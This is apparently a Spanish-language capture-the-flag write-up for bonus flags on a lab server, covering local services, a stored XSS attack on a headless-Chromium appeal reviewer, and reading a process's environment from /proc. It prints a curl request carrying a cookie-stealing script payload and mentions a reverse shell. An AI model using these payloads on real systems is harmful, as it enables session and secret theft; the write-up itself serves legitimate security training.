# Bonus flags

Aquí la lista de flags de la parte opcional del proyecto, que no corresponden al proceso de escalado de privilegios. Mayormente, descubrimiento y explotación de procesos internos del servidor.

## Whisper

La configuración asociada al servicio:
```bash

wil@hal9042:/etc/systemd/system$ cat hal9042-whisper.service
[Unit]
Description=HAL9042 UDP telemetry channel (optional F12)
After=network.target
[Service]
Type=simple
User=nobody
Environment=UDP_PORT=1337
Environment=MAGIC=KNOCK
EnvironmentFile=/etc/hal9042/whisper.env
ExecStart=/usr/bin/python3 /opt/hal9042/services/whisper.py
Restart=always
RestartSec=5
[Install]
WantedBy=multi-user.target

```

```bash
nc -u 127.0.0.1 1337
```

Se manda el mensaje en el formato pedido y se obtiene la flag.

## Telemetry

```bash
wil@hal9042:/etc/systemd/system$ cat hal9042-telemetry.service
[Unit]
Description=HAL9042 internal telemetry endpoint (optional F14, loopback)
After=network.target
[Service]
Type=simple
User=nobody
Environment=F14_PORT=9000
Environment=F14_PATH=/internal/telemetry
EnvironmentFile=/etc/hal9042/telemetry.env
ExecStart=/usr/bin/python3 /opt/hal9042/services/telemetry.py
Restart=always
RestartSec=5
[Install]
WantedBy=multi-user.target

```

Con una petición a `127.0.0.1:9000` se recibe un mensaje genérico, pero si se añade el path definido en el entorno (`127.0.0.1:9000/internal/telemetry`) se obtiene la flag.

## Reviewer

### WSTG-INPV-02

La configuración asociada al servicio:

```bash
wil@hal9042:~$ cat /etc/systemd/system/hal9042-reviewer.service
[Unit]
Description=HAL9042 grade-appeal reviewer (headless Chromium, optional F11)
After=network.target hal9042-web.service
Wants=hal9042-web.service

[Service]
Type=simple
User=halrev
Group=halrev
Environment=HOME=/opt/hal9042/reviewer
Environment=APP_URL=http://127.0.0.1:5042
Environment=INTERVAL=12
EnvironmentFile=/etc/hal9042/reviewer.env
ExecStart=/opt/hal9042/reviewer/venv/bin/python /opt/hal9042/reviewer/reviewer.py
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target


wil@hal9042:~$ systemctl status hal9042-reviewer
● hal9042-reviewer.service - HAL9042 grade-appeal reviewer (headless Chromium, optional F11)
     Loaded: loaded (/etc/systemd/system/hal9042-reviewer.service; enabled; preset: enabled)
     Active: active (running) since Tue 2026-08-11 07:58:52 UTC; 7h ago
   Main PID: 553 (python)
      Tasks: 56 (limit: 2263)
     Memory: 346.3M (peak: 537.2M)
        CPU: 47min 14.845s
     CGroup: /system.slice/hal9042-reviewer.service
             ├─553 /opt/hal9042/reviewer/venv/bin/python /opt/hal9042/reviewer/reviewer.py
             ├─675 /opt/hal9042/reviewer/venv/lib/python3.12/site-packages/playwright/driver/node /opt/hal>
             ├─918 /opt/hal9042/reviewer/.cache/ms-playwright/chromium-1134/chrome-linux/chrome --disable->
             ├─971 "/opt/hal9042/reviewer/.cache/ms-playwright/chromium-1134/chrome-linux/chrome --type=zy>
             ├─972 "/opt/hal9042/reviewer/.cache/ms-playwright/chromium-1134/chrome-linux/chrome --type=zy>
             ├─990 "/opt/hal9042/reviewer/.cache/ms-playwright/chromium-1134/chrome-linux/chrome --type=gp>
             └─993 "/opt/hal9042/reviewer/.cache/ms-playwright/chromium-1134/chrome-linux/chrome --type=ut>

Warning: some journal files were not opened due to insufficient permissions.
```

Tenemos un servicio que levanta desde `playwright` un chromium headless, sin puertos de debug.
Por lo que vemos en el entorno, podemos asumir que hace algún acceso a la web cada 12 segundos.

Podríamos analizar la interfaz de red con `tcpdump` (está disponible en el servidor), pero no tenemos a ningún usuario con capacidades de ejecución.

Del reconocimiento de la web, notamos que el formulario de `appeal` era vulnerable a un ataque de **XSS** (no sanitiza html introducido por usuario).
Podemos suponer que la lógica de ejecución del script del servicio es acceder a todos los appeals posteados en la web (se puede confirmar mirando los logs de acceso con peticiones con user-agent **HeadlessChrome**).
Intentamos exfiltrar las variables de entorno del cliente.

El problema que hay que superar para exfiltrar las cookies es que no podemos hacer peticiones a un tercer dominio, ya que el servidor está configurado con CORS
y nos va a bloquear cualquier petición a un servidor de nuestro control.

Estamos limitados a exfiltrar dentro del propio dominio, por lo que haremos uso de los logs del propio servidor para obtener la flag.


```bash
curl 'http://10.1.0.8:5042/appeal' \
  -X POST \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:150.0) Gecko/20100101 Firefox/150.0' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' \
  -H 'Accept-Language: en-US,en;q=0.9' \
  -H 'Accept-Encoding: gzip, deflate' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Origin: http://10.1.0.8:5042' \
  -H 'Sec-GPC: 1' \
  -H 'Connection: keep-alive' \
  -H 'Referer: http://10.1.0.8:5042/appeal' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'Priority: u=0, i' \
  --data-raw 'project=boot2root&reason=%3Cscript%3E%0D%0Afetch%28%27%2Ftremendo%2F%3F%3D%27+%2B+encodeURIComponent%28document.cookie%29%29%3B%0D%0A%3C%2Fscript%3E%0D%0A%3Cdiv+style%3D%27background-color%3A+red%27%3E+%3A%28+%3C%2Fdiv%3E'
```

```html
<script>
fetch('/tremendo/?=' + encodeURIComponent(document.cookie));
</script>
<div style='background-color: red'> :( </div>
```

Los logs tienen como propietario a `www-data`, por lo que levantamos la reverse shell, hacemos un `grep tremendo /var/log/nginx/access.log` y obtenemos la flag.

## Daemon

```bash
wil@hal9042:~$ cat /etc/systemd/system/hal9042d.service
[Unit]
Description=HAL9042 evaluation daemon (port 7042, debug mode left on)
After=network.target

[Service]
Type=simple
User=wil
Group=wil
# Explicit so a wil shell obtained via DEBUG: can write ol's check.sh
# (group evalops) regardless of systemd's initgroups behavior.
SupplementaryGroups=evalops
EnvironmentFile=/etc/hal9042/daemon.env
ExecStart=/opt/hal9042/daemon
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
```

El proceso se ejecuta desde el usuario `wil`, por tanto podemos tener acceso a todo el entorno del proceso.

```bash
wil@hal9042:~$ systemctl status hal9042d
● hal9042d.service - HAL9042 evaluation daemon (port 7042, debug mode left on)
     Loaded: loaded (/etc/systemd/system/hal9042d.service; enabled; preset: enabled)
     Active: active (running) since Tue 2026-08-11 07:58:52 UTC; 7h ago
   Main PID: 557 (daemon)
      Tasks: 1 (limit: 2263)
     Memory: 520.0K (peak: 3.1M)
        CPU: 84ms
     CGroup: /system.slice/hal9042d.service
             └─557 /opt/hal9042/daemon

Warning: some journal files were not opened due to insufficient permissions.
```

Si accedemos a la carpeta en `/proc` correspondiente al proceso (en este caso, **557**), podemos tener acceso al entorno con el que se ha cargado (la línea `/etc/hal9042/daemon.env`).

Haciendo `cat /proc/557/environ` nos da la flag.

## Strings

